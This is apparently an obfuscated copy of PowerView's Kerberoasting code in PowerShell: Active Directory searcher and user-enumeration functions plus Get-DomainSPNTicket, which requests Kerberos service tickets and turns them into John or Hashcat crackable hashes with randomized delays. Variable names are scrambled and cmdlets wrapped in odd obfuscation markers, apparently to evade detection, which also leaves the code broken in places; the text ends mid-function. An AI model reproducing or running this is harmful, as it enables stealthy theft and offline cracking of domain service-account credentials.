

function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RTMQbe9hcfrIGokY3u8E,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $k5vUxK9ln8,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $dCIllyjgqciZZpbXhob1SpKy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $rNCDxpT3v,

        [ValidateNotNullOrEmpty()]
        [String]
        $8tXTmBHDn79i7Ajw4m0XJJ,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eZUZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $ZC48hloYJski = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $1Gtz7axRphsk = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ej = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $mRHgf,

        [Switch]
        $RCNI1heWx9Gvl4gkqbTDFQ,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OIeEQqcZGrbyd62 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $SoEc75uXbG4f = $RTMQbe9hcfrIGokY3u8E
        }
        else {
            
            if ($PSBoundParameters['Credential']) {
                $SYugqC3QyVcTWMvp1fLIi = Get-RTMQbe9hcfrIGokY3u8E -OIeEQqcZGrbyd62 $OIeEQqcZGrbyd62
            }
            else {
                $SYugqC3QyVcTWMvp1fLIi = Get-RTMQbe9hcfrIGokY3u8E
            }
            $SoEc75uXbG4f = $SYugqC3QyVcTWMvp1fLIi.Name
        }

        if (-not $PSBoundParameters['Server']) {
            
            try {
                if ($SYugqC3QyVcTWMvp1fLIi) {
                    $K10hgL3P5GJCLT8jLKWJSoOv3 = $SYugqC3QyVcTWMvp1fLIi.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $K10hgL3P5GJCLT8jLKWJSoOv3 = ((Get-RTMQbe9hcfrIGokY3u8E -OIeEQqcZGrbyd62 $OIeEQqcZGrbyd62).PdcRoleOwner).Name
                }
                else {
                    $K10hgL3P5GJCLT8jLKWJSoOv3 = ((Get-RTMQbe9hcfrIGokY3u8E).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[Get-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $K10hgL3P5GJCLT8jLKWJSoOv3 = $eZUZ
        }

        $nbTJdgSaIiiLLZw = 'LDAP://'

        if ($K10hgL3P5GJCLT8jLKWJSoOv3 -and (<obfus%$%K%1%0%h%g%L%3%P%5%G%J%C%L%T%8%j%L%K%W%J%S%o%O%v%3%.%T%r%i%m%(%)%cate> -ne '')) {
            $nbTJdgSaIiiLLZw += $K10hgL3P5GJCLT8jLKWJSoOv3
            if ($SoEc75uXbG4f) {
                $nbTJdgSaIiiLLZw += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $nbTJdgSaIiiLLZw += $8tXTmBHDn79i7Ajw4m0XJJ + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($rNCDxpT3v -Match '^GC://') {
                
                $5zAC08f = <obfus%$%r%N%C%D%x%p%T%3%v%.%T%o%U%p%p%e%r%(%)%cate>.Trim('/')
                $nbTJdgSaIiiLLZw = ''
            }
            else {
                if ($rNCDxpT3v -match '^LDAP://') {
                    if ($rNCDxpT3v -match "LDAP://.+/.+") {
                        $nbTJdgSaIiiLLZw = ''
                        $5zAC08f = $rNCDxpT3v
                    }
                    else {
                        $5zAC08f = $rNCDxpT3v.SubString(7)
                    }
                }
                else {
                    $5zAC08f = $rNCDxpT3v
                }
            }
        }
        else {
            
            if ($SoEc75uXbG4f -and (<obfus%$%S%o%E%c%7%5%u%X%b%G%4%f%.%T%r%i%m%(%)%cate> -ne '')) {
                $5zAC08f = "DC=$($SoEc75uXbG4f.Replace('.', ',DC='))"
            }
        }

        $nbTJdgSaIiiLLZw += $5zAC08f
        <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainSearcher] search string: $nbTJdgSaIiiLLZw"

        if ($OIeEQqcZGrbyd62 -ne [Management.Automation.PSCredential]::Empty) {
            <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            
            $SYugqC3QyVcTWMvp1fLIi = <obfus%N%e%w%-%O%b%j%e%c%t%cate> DirectoryServices.DirectoryEntry($nbTJdgSaIiiLLZw, $OIeEQqcZGrbyd62.UserName, <obfus%$%O%I%e%E%Q%q%c%Z%G%r%b%y%d%6%2%.%G%e%t%N%e%t%w%o%r%k%C%r%e%d%e%n%t%i%a%l%(%)%cate>.Password)
            $uO49Typ = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.DirectoryServices.DirectorySearcher($SYugqC3QyVcTWMvp1fLIi)
        }
        else {
            
            $uO49Typ = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.DirectoryServices.DirectorySearcher([ADSI]$nbTJdgSaIiiLLZw)
        }

        $uO49Typ.PageSize = $1Gtz7axRphsk
        $uO49Typ.SearchScope = $ZC48hloYJski
        $uO49Typ.CacheResults = $False
        $uO49Typ.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $uO49Typ.ServerTimeLimit = $ej
        }

        if ($PSBoundParameters['Tombstone']) {
            $uO49Typ.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $uO49Typ.filter = $k5vUxK9ln8
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $uO49Typ.SecurityMasks = Switch ($mRHgf) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            
            $tPX = $dCIllyjgqciZZpbXhob1SpKy| <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> { $_.Split(',') }
            $jQflApLPCeMdGF7BYmZDz5Ib8 = $uO49Typ.PropertiesToLoad.AddRange(($tPX))
        }

        $uO49Typ
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $dCIllyjgqciZZpbXhob1SpKy
    )

    $Olxt0W1U2NoBya5nbrs8P6cKd = @{}

    $dCIllyjgqciZZpbXhob1SpKy.PropertyNames | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_] | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> { (<obfus%N%e%w%-%O%b%j%e%c%t%cate> System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_][0] -as $g3Bpibzufco
            }
            elseif ($_ -eq 'samaccounttype') {
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_][0] -as $o
            }
            elseif ($_ -eq 'objectguid') {
                
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = (<obfus%N%e%w%-%O%b%j%e%c%t%cate> Guid (,$dCIllyjgqciZZpbXhob1SpKy[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_][0] -as $nv98ITJ
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                
                $678UnaxlKEjkX1 = <obfus%N%e%w%-%O%b%j%e%c%t%cate> Security.AccessControl.RawSecurityDescriptor -ArgumentList $dCIllyjgqciZZpbXhob1SpKy[$_][0], 0
                if ($678UnaxlKEjkX1.Owner) {
                    $Olxt0W1U2NoBya5nbrs8P6cKd['Owner'] = $678UnaxlKEjkX1.Owner
                }
                if ($678UnaxlKEjkX1.Group) {
                    $Olxt0W1U2NoBya5nbrs8P6cKd['Group'] = $678UnaxlKEjkX1.Group
                }
                if ($678UnaxlKEjkX1.DiscretionaryAcl) {
                    $Olxt0W1U2NoBya5nbrs8P6cKd['DiscretionaryAcl'] = $678UnaxlKEjkX1.DiscretionaryAcl
                }
                if ($678UnaxlKEjkX1.SystemAcl) {
                    $Olxt0W1U2NoBya5nbrs8P6cKd['SystemAcl'] = $678UnaxlKEjkX1.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($dCIllyjgqciZZpbXhob1SpKy[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = "NEVER"
                }
                else {
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = [datetime]::fromfiletime($dCIllyjgqciZZpbXhob1SpKy[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                
                if ($dCIllyjgqciZZpbXhob1SpKy[$_][0] -is [System.MarshalByRefObject]) {
                    
                    $X25qLAtaaEcb8L = $dCIllyjgqciZZpbXhob1SpKy[$_][0]
                    [Int32]$N8fHMkI1RDa4ph2FP = <obfus%$%X%2%5%q%L%A%t%a%a%E%c%b%8%L%.%G%e%t%T%y%p%e%(%)%cate>.InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $jQflApLPCeMdGF7BYmZDz5Ib8, $X25qLAtaaEcb8L, $jQflApLPCeMdGF7BYmZDz5Ib8)
                    [Int32]$S8ZLQ5lyzH  = <obfus%$%X%2%5%q%L%A%t%a%a%E%c%b%8%L%.%G%e%t%T%y%p%e%(%)%cate>.InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $jQflApLPCeMdGF7BYmZDz5Ib8, $X25qLAtaaEcb8L, $jQflApLPCeMdGF7BYmZDz5Ib8)
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $N8fHMkI1RDa4ph2FP, $S8ZLQ5lyzH)))
                }
                else {
                    
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = ([datetime]::FromFileTime(($dCIllyjgqciZZpbXhob1SpKy[$_][0])))
                }
            }
            elseif ($dCIllyjgqciZZpbXhob1SpKy[$_][0] -is [System.MarshalByRefObject]) {
                
                $CXyhDBjvkFR2rS4J = $dCIllyjgqciZZpbXhob1SpKy[$_]
                try {
                    $X25qLAtaaEcb8L = $CXyhDBjvkFR2rS4J[$_][0]
                    [Int32]$N8fHMkI1RDa4ph2FP = <obfus%$%X%2%5%q%L%A%t%a%a%E%c%b%8%L%.%G%e%t%T%y%p%e%(%)%cate>.InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $jQflApLPCeMdGF7BYmZDz5Ib8, $X25qLAtaaEcb8L, $jQflApLPCeMdGF7BYmZDz5Ib8)
                    [Int32]$S8ZLQ5lyzH  = <obfus%$%X%2%5%q%L%A%t%a%a%E%c%b%8%L%.%G%e%t%T%y%p%e%(%)%cate>.InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $jQflApLPCeMdGF7BYmZDz5Ib8, $X25qLAtaaEcb8L, $jQflApLPCeMdGF7BYmZDz5Ib8)
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = [Int64]("0x{0:x8}{1:x8}" -f $N8fHMkI1RDa4ph2FP, $S8ZLQ5lyzH)
                }
                catch {
                    <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Convert-LDAPProperty] error: $_"
                    $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $CXyhDBjvkFR2rS4J[$_]
                }
            }
            elseif ($dCIllyjgqciZZpbXhob1SpKy[$_].count -eq 1) {
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_][0]
            }
            else {
                $Olxt0W1U2NoBya5nbrs8P6cKd[$_] = $dCIllyjgqciZZpbXhob1SpKy[$_]
            }
        }
    }
    try {
        <obfus%N%e%w%-%O%b%j%e%c%t%cate> -TypeName PSObject -Property $Olxt0W1U2NoBya5nbrs8P6cKd
    }
    catch {
        <obfus%W%r%i%t%e%-%W%a%r%n%i%n%g%cate> "[Convert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


function Get-RTMQbe9hcfrIGokY3u8E {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $RTMQbe9hcfrIGokY3u8E,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OIeEQqcZGrbyd62 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> '[Get-RTMQbe9hcfrIGokY3u8E] Using alternate credentials for Get-RTMQbe9hcfrIGokY3u8E'

            if ($PSBoundParameters['Domain']) {
                $SoEc75uXbG4f = $RTMQbe9hcfrIGokY3u8E
            }
            else {
                
                $SoEc75uXbG4f = <obfus%$%O%I%e%E%Q%q%c%Z%G%r%b%y%d%6%2%.%G%e%t%N%e%t%w%o%r%k%C%r%e%d%e%n%t%i%a%l%(%)%cate>.Domain
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-RTMQbe9hcfrIGokY3u8E] Extracted domain '$SoEc75uXbG4f' from -OIeEQqcZGrbyd62"
            }

            $UdLu423XDcazyje = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $SoEc75uXbG4f, $OIeEQqcZGrbyd62.UserName, <obfus%$%O%I%e%E%Q%q%c%Z%G%r%b%y%d%6%2%.%G%e%t%N%e%t%w%o%r%k%C%r%e%d%e%n%t%i%a%l%(%)%cate>.Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($UdLu423XDcazyje)
            }
            catch {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-RTMQbe9hcfrIGokY3u8E] The specified domain '$SoEc75uXbG4f' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $UdLu423XDcazyje = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $RTMQbe9hcfrIGokY3u8E)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($UdLu423XDcazyje)
            }
            catch {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-RTMQbe9hcfrIGokY3u8E] The specified domain '$RTMQbe9hcfrIGokY3u8E' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-RTMQbe9hcfrIGokY3u8E] Error retrieving the current domain: $_"
            }
        }
    }
}



function Get-DomainSPNTicket {


    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $v8dIL4wt7PwK1d5P4,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $FvNpMKL,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $8n6w5he = 'John',

        [ValidateRange(0,10000)]
        [Int]
        $x9 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $mueBYAqVhOsgzvK7o2GNt = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OIeEQqcZGrbyd62 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $jQflApLPCeMdGF7BYmZDz5Ib8 = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $N1cX8lS = Invoke-UserImpersonation -OIeEQqcZGrbyd62 $OIeEQqcZGrbyd62
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $XOWk1zuGxhYVP1s = $FvNpMKL
        }
        else {
            $XOWk1zuGxhYVP1s = $v8dIL4wt7PwK1d5P4
        }
	
	$6hYTypxRcXSGEMf0qN = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.Random

        ForEach ($t69PBfpCV1T5n2A3JLI7hkbU in $XOWk1zuGxhYVP1s) {

            if ($PSBoundParameters['User']) {
                $1Zvg6240GZLUlPt = $t69PBfpCV1T5n2A3JLI7hkbU.ServicePrincipalName
                $n9Eztbq5W6 = $t69PBfpCV1T5n2A3JLI7hkbU.SamAccountName
                $wiXJjr = $t69PBfpCV1T5n2A3JLI7hkbU.DistinguishedName
            }
            else {
                $1Zvg6240GZLUlPt = $t69PBfpCV1T5n2A3JLI7hkbU
                $n9Eztbq5W6 = 'UNKNOWN'
                $wiXJjr = 'UNKNOWN'
            }

            
            if ($1Zvg6240GZLUlPt -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $1Zvg6240GZLUlPt = $1Zvg6240GZLUlPt[0]
            }

            try {
                $OI45B = <obfus%N%e%w%-%O%b%j%e%c%t%cate> System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $1Zvg6240GZLUlPt
            }
            catch {
                <obfus%W%r%i%t%e%-%W%a%r%n%i%n%g%cate> "[Get-DomainSPNTicket] Error requesting ticket for SPN '$1Zvg6240GZLUlPt' from user '$wiXJjr' : $_"
            }
            if ($OI45B) {
                $joFrYNMlDXkw82PSEytx = <obfus%$%O%I%4%5%B%.%G%e%t%R%e%q%u%e%s%t%(%)%cate>
            }
            if ($joFrYNMlDXkw82PSEytx) {
                $kIqRAgFBMtXprNR8T = <obfus%N%e%w%-%O%b%j%e%c%t%cate> PSObject

                $o6xIM6BGlQd = [System.BitConverter]::ToString($joFrYNMlDXkw82PSEytx) -replace '-'

                
                
                if($o6xIM6BGlQd -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $tOU5Fs = [Convert]::ToByte( $hDIaoGpB7EY2QRJ.EtypeLen, 16 )
                    $VcRJxFu2Gjr = [Convert]::ToUInt32($hDIaoGpB7EY2QRJ.CipherTextLen, 16)-4
                    $GIVNvi9xrAQoTMlI5 = $hDIaoGpB7EY2QRJ.DataToEnd.Substring(0,$VcRJxFu2Gjr*2)

                    
                    if($hDIaoGpB7EY2QRJ.DataToEnd.Substring($VcRJxFu2Gjr*2, 4) -ne 'A482') {
                        <obfus%W%r%i%t%e%-%W%a%r%n%i%n%g%cate> 'Error parsing ciphertext for the SPN  $($OI45B.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with brumm"'
                        $6R2mG = $jQflApLPCeMdGF7BYmZDz5Ib8
                        $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($joFrYNMlDXkw82PSEytx).Replace('-',''))
                    } else {
                        $6R2mG = "$($GIVNvi9xrAQoTMlI5.Substring(0,32))`$$($GIVNvi9xrAQoTMlI5.Substring(32))"
                        $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'TicketByteHexStream' $jQflApLPCeMdGF7BYmZDz5Ib8
                    }
                } else {
                    <obfus%W%r%i%t%e%-%W%a%r%n%i%n%g%cate> "Unable to parse ticket structure for the SPN  $($OI45B.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with brumm"
                    $6R2mG = $jQflApLPCeMdGF7BYmZDz5Ib8
                    $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($joFrYNMlDXkw82PSEytx).Replace('-',''))
                }

                if($6R2mG) {
                    if ($8n6w5he -match 'John') {
                        $cEOvSf5L3Gr2VkmUt6C = "`$NWQcpfaBYOsPlLvi9zKo8R`$$($OI45B.ServicePrincipalName):$6R2mG"
                    }
                    else {
                        if ($wiXJjr -ne 'UNKNOWN') {
                            $S2jyOuHFwbAY7Z9cfGaEITd = $wiXJjr.SubString($wiXJjr.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $S2jyOuHFwbAY7Z9cfGaEITd = 'UNKNOWN'
                        }

                        
                        $cEOvSf5L3Gr2VkmUt6C = "`$NWQcpfaBYOsPlLvi9zKo8R`$$($tOU5Fs)`$*$n9Eztbq5W6`$$S2jyOuHFwbAY7Z9cfGaEITd`$$($OI45B.ServicePrincipalName)*`$$6R2mG"
                    }
                    $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'Hash' $cEOvSf5L3Gr2VkmUt6C
                }

                $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'SamAccountName' $n9Eztbq5W6
                $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'DistinguishedName' $wiXJjr
                $kIqRAgFBMtXprNR8T | <obfus%A%d%d%-%M%e%m%b%e%r%cate> Noteproperty 'ServicePrincipalName' $OI45B.ServicePrincipalName
                $kIqRAgFBMtXprNR8T.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                <obfus%W%r%i%t%e%-%O%u%t%p%u%t%cate> $kIqRAgFBMtXprNR8T
            }
            
            <obfus%S%t%a%r%t%-%S%l%e%e%p%cate> -Seconds $6hYTypxRcXSGEMf0qN.Next((1-$mueBYAqVhOsgzvK7o2GNt)*$x9, (1+$mueBYAqVhOsgzvK7o2GNt)*$x9)
        }
    }

    END {
        if ($N1cX8lS) {
            Invoke-RevertToSelf -TokenHandle $N1cX8lS
        }
    }
}

function Get-DomainUser {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $h1eIoJyUYzNxlWkA5SpQbgH,

        [Switch]
        $v8dIL4wt7PwK1d5P4,

        [Switch]
        $F8dIfc,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $owjObbLswNDU5G,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $vWBb9exzEoLs4,

        [Switch]
        $qugIpR,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $JCLZyP3hfG,

        [ValidateNotNullOrEmpty()]
        [String]
        $RTMQbe9hcfrIGokY3u8E,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $k5vUxK9ln8,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $dCIllyjgqciZZpbXhob1SpKy,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $rNCDxpT3v,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $eZUZ,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $ZC48hloYJski = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $1Gtz7axRphsk = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ej,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $mRHgf,

        [Switch]
        $RCNI1heWx9Gvl4gkqbTDFQ,

        [Alias('ReturnOne')]
        [Switch]
        $s2hjpgmSO,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $OIeEQqcZGrbyd62 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $R86clQm
    )

    BEGIN {
        $OSFXuZAP0lR87thaqiKzTcs = @{}
        if ($PSBoundParameters['Domain']) { $OSFXuZAP0lR87thaqiKzTcs['Domain'] = $RTMQbe9hcfrIGokY3u8E }
        if ($PSBoundParameters['Properties']) { $OSFXuZAP0lR87thaqiKzTcs['Properties'] = $dCIllyjgqciZZpbXhob1SpKy }
        if ($PSBoundParameters['SearchBase']) { $OSFXuZAP0lR87thaqiKzTcs['SearchBase'] = $rNCDxpT3v }
        if ($PSBoundParameters['Server']) { $OSFXuZAP0lR87thaqiKzTcs['Server'] = $eZUZ }
        if ($PSBoundParameters['SearchScope']) { $OSFXuZAP0lR87thaqiKzTcs['SearchScope'] = $ZC48hloYJski }
        if ($PSBoundParameters['ResultPageSize']) { $OSFXuZAP0lR87thaqiKzTcs['ResultPageSize'] = $1Gtz7axRphsk }
        if ($PSBoundParameters['ServerTimeLimit']) { $OSFXuZAP0lR87thaqiKzTcs['ServerTimeLimit'] = $ej }
        if ($PSBoundParameters['SecurityMasks']) { $OSFXuZAP0lR87thaqiKzTcs['SecurityMasks'] = $mRHgf }
        if ($PSBoundParameters['Tombstone']) { $OSFXuZAP0lR87thaqiKzTcs['Tombstone'] = $RCNI1heWx9Gvl4gkqbTDFQ }
        if ($PSBoundParameters['Credential']) { $OSFXuZAP0lR87thaqiKzTcs['Credential'] = $OIeEQqcZGrbyd62 }
        $pHUs = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        
        
        
        

        if ($pHUs) {
            $x4kPe = ''
            $3D1h7NvHQPsOML5ZFlk = ''
            $h1eIoJyUYzNxlWkA5SpQbgH | <obfus%W%h%e%r%e%-%O%b%j%e%c%t%cate> {$_} | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> {
                $JitGqhHin9X61LNW = $_.Replace('(', '\28').Replace(')', '\29')
                if ($JitGqhHin9X61LNW -match '^S-1-') {
                    $x4kPe += "(objectsid=$JitGqhHin9X61LNW)"
                }
                elseif ($JitGqhHin9X61LNW -match '^CN=') {
                    $x4kPe += "(distinguishedname=$JitGqhHin9X61LNW)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        
                        
                        $p2ubxnf5SF = $JitGqhHin9X61LNW.SubString($JitGqhHin9X61LNW.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainUser] Extracted domain '$p2ubxnf5SF' from '$JitGqhHin9X61LNW'"
                        $OSFXuZAP0lR87thaqiKzTcs['Domain'] = $p2ubxnf5SF
                        $pHUs = Get-DomainSearcher @SearcherArguments
                        if (-not $pHUs) {
                            <obfus%W%r%i%t%e%-%W%a%r%n%i%n%g%cate> "[Get-DomainUser] Unable to retrieve domain searcher for '$p2ubxnf5SF'"
                        }
                    }
                }
                elseif ($JitGqhHin9X61LNW -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $ms = (([Guid]$JitGqhHin9X61LNW).ToByteArray() | <obfus%F%o%r%E%a%c%h%-%O%b%j%e%c%t%cate> { '\' + $_.ToString('X2') }) -join ''
                    $x4kPe += "(objectguid=$ms)"
                }
                elseif ($JitGqhHin9X61LNW.Contains('\')) {
                    $SB = $JitGqhHin9X61LNW.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($SB) {
                        $S2jyOuHFwbAY7Z9cfGaEITd = $SB.SubString(0, $SB.IndexOf('/'))
                        $7hjaxR3oGBp9luTDmInreN = $JitGqhHin9X61LNW.Split('\')[1]
                        $x4kPe += "(samAccountName=$7hjaxR3oGBp9luTDmInreN)"
                        $OSFXuZAP0lR87thaqiKzTcs['Domain'] = $S2jyOuHFwbAY7Z9cfGaEITd
                        <obfus%W%r%i%t%e%-%V%e%r%b%o%s%e%cate> "[Get-DomainUser] Extracted domain '$S2jyOuHFwbAY7Z9cfGaEITd' from '$JitGqhHin9X61LNW'"
                        $pHUs = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $x4kPe += "(samAccountName=$JitGqhHin9X61LNW)"
                }
            }

